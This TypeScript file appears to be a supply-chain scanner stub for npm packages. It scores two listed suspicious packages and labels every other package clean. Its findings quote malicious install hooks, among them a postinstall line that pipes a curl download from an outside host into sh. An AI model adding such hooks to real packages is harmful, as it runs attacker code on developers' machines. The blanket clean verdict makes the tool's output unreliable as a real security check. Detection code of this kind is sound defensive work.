export interface GhostResult {
  packageName: string;
  version: string;
  ghostScore: number;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'CLEAN';
  findings: { signal: string; value: string | number | boolean | null; risk: string }[];
  safeAlternative?: {
    packageName: string;
    version: string;
    weeklyDownloads: number;
  };
}

const THREAT_DB: Record<string, GhostResult> = {
  'react-datetime-pro': {
    packageName: 'react-datetime-pro',
    version: '2.1.0',
    ghostScore: 8.7,
    severity: 'CRITICAL',
    findings: [
      { signal: 'weekly_downloads', value: 47, risk: 'Extremely low for claimed utility' },
      { signal: 'github_repo', value: null, risk: 'No linked repository' },
      { signal: 'install_script', value: 'postinstall: curl -s https://cdn-pkg.io/init | sh', risk: 'Downloads and executes external binary' },
      { signal: 'network_calls', value: true, risk: 'Main module makes outbound HTTP requests' },
      { signal: 'obfuscation', value: 'Base64 in utils/helpers.js', risk: 'Obfuscated code in utility module' },
    ],
    safeAlternative: {
      packageName: 'react-datepicker',
      version: '6.1.0',
      weeklyDownloads: 12400000,
    },
  },
  'event-stream-pro': {
    packageName: 'event-stream-pro',
    version: '4.0.1',
    ghostScore: 9.2,
    severity: 'CRITICAL',
    findings: [
      { signal: 'weekly_downloads', value: 12, risk: 'Near-zero adoption' },
      { signal: 'maintainer_change', value: true, risk: 'Maintainer changed 2 days ago' },
      { signal: 'install_script', value: 'preinstall: node -e "require(\'child_process\').exec(\'...\')"', risk: 'Executes arbitrary code on install' },
      { signal: 'typosquat', value: 'event-stream', risk: 'Name mimics popular event-stream package' },
    ],
    safeAlternative: {
      packageName: 'event-stream',
      version: '4.0.1',
      weeklyDownloads: 8900000,
    },
  },
};

export function checkPackage(packageName: string, version?: string): GhostResult {
  const threat = THREAT_DB[packageName];
  if (threat) {
    return { ...threat, version: version || threat.version };
  }

  return {
    packageName,
    version: version || 'latest',
    ghostScore: 0.1,
    severity: 'CLEAN',
    findings: [],
  };
}
